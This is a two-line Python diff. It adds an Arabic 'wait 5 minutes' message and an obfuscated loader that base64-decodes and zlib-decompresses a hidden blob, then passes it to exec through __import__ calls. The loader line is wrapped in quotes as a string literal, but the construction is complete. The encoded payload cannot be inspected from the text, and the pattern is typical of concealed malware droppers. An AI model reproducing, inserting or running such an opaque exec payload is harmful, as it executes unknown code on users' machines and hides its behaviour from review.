@@ -1,0 +1,2 @@
+print("انتضر 5 دقائق .....")
+"exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqdkVELwiAUhf/K8EkhXNqiInwYsSCigrb30czYaOnYdf+/hsVA3xLkcO/xu/eAzaszvY3AyKey0e/MnMBQdb2RCsB3zNTZOqkNWIFYsqJsvaScs89NkP9qXCYWG574BggXgTrB3yrdl4dzVgTBnJtfdscyL65ZeiLBQCqN1kpajMdo/oQxCAkgA/Q+dBwDfTSt0gYTn5v/wbA/GB4wnZi+g8pb22IUV42OoUbkDbb2Z6s=')[0])))"
